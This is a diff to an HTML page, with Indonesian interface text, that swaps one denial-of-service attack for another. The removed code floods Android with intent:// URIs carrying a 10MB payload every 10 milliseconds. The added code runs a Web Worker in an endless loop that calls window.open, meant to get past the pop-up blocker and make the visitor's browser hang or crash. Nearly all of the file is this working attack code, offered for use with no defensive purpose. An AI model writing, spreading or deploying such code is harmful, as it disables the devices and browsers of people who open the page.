@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Brutal Intent Bombing</title>
+<title>Pop-up Blocker Flooding (DoS)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
@@ -14,7 +14,6 @@ button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radiu
 button:hover { background: #b71c1c; }
 button:disabled { background: #555; }
 #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
-.log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
 .warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
 @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
 </style>
@@ -22,70 +21,66 @@ button:disabled { background: #555; }
 
 <body>
 <div class="panel" id="main-panel">
-    <div class="warning">⚠️ PERINGATAN: Ini akan memicu Intent Bombing ke sistem. Perangkat Anda mungkin akan hang!</div>
-    <h1>Brutal Intent Bombing</h1>
-    <p>Menembakkan Intent dalam jumlah masif dengan payload berukuran besar.</p>
+    <div class="warning">⚠️ PERINGATAN: Klik tombol ini akan membanjiri browser dengan Pop-up. Browser Anda (terutama Edge) akan hang/force close!</div>
+    <h1>Pop-up Flooding DoS</h1>
+    <p>Menembakkan window.open() tanpa henti via Web Worker.</p>
     
-    <button id="start-btn" type="button">Mulai Intent Bombing</button>
+    <button id="start-btn" type="button">Mulai Pop-up Flooding</button>
     <div id="status" role="status">Sistem siap.</div>
-    <div class="log" id="log">Log akan muncul di sini...</div>
 </div>
 
 <script>
     const startBtn = document.getElementById("start-btn");
     const statusDiv = document.getElementById("status");
-    const logDiv = document.getElementById("log");
-
     let isRunning = false;
-    let count = 0;
-
-    function log(msg) {
-        logDiv.innerHTML += "<br>> " + msg;
-        console.log(msg);
-    }
+    let tabCount = 0;
 
     startBtn.addEventListener("click", () => {
         if (isRunning) return;
         isRunning = true;
-        startBtn.disabled = true;
         
-        statusDiv.textContent = "Memulai Intent Bombing...";
+        startBtn.disabled = true;
+        statusDiv.textContent = "MEMULAI FLOODING! BROWSER AKAN HANG...";
         statusDiv.style.color = "#ff4444";
-        log("Memulai Intent Bombing...");
 
-        // Membuat payload data besar (10MB string)
-        const hugeData = "A".repeat(10 * 1024 * 1024);
+        // Kode Worker: Infinite Loop untuk mengirim sinyal 'OPEN'
+        const workerCode = `
+            self.onmessage = function(e) {
+                if (e.data === 'START') {
+                    while(true) {
+                        self.postMessage('OPEN');
+                    }
+                }
+            };
+        `;
 
-        // Loop untuk menembak Intent secara beruntun
-        function fireIntent() {
-            if (!isRunning) return;
-            
-            count++;
-            statusDiv.textContent = `Intent ke-${count} ditembakkan...`;
-            
-            try {
-                // Intent Bombing: Action VIEW + Data Besar
-                // Tujuannya untuk membuat Intent Resolver Android kewalahan
-                const intentBomb = `intent://#Intent;action=android.intent.action.VIEW;S.huge_payload=${hugeData};package=com.android.chrome;end`;
-                
-                // Tembak Intent
-                window.location.href = intentBomb;
+        try {
+            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+            const worker = new Worker(URL.createObjectURL(workerBlob));
 
-                // Tembak variasi lain (Buka Instagram bersamaan)
-                const instagramBomb = "intent://instagram.com/_u/theonly_w4gur1/#Intent;scheme=https;package=com.instagram.android;category=android.intent.category.BROWSABLE;end";
-                window.location.href = instagramBomb;
+            // Terima sinyal dan buka tab via Microtask
+            worker.onmessage = function(e) {
+                if (e.data === 'OPEN') {
+                    // Gunakan queueMicrotask untuk bypass Pop-up Blocker secepat mungkin
+                    queueMicrotask(() => {
+                        try {
+                            window.open('https://google.com', '_blank');
+                            tabCount++;
+                            
+                            // Update status setiap 10 tab
+                            if (tabCount % 10 === 0) {
+                                statusDiv.textContent = `Mencoba membuka ${tabCount} tab...`;
+                            }
+                        } catch (err) {}
+                    });
+                }
+            };
 
-                log(`[${count}] Intent ditembakkan.`);
-            } catch (e) {
-                log(`[${count}] Gagal: ${e.message}`);
-            }
-
-            // Loop secepat mungkin (setTimeout 10ms)
-            setTimeout(fireIntent, 10);
+            // Mulai Worker
+            worker.postMessage('START');
+        } catch (e) {
+            statusDiv.textContent = "Gagal memulai Worker: " + e.message;
         }
-
-        // Mulai tembakan
-        fireIntent();
     });
 </script>
 </body>
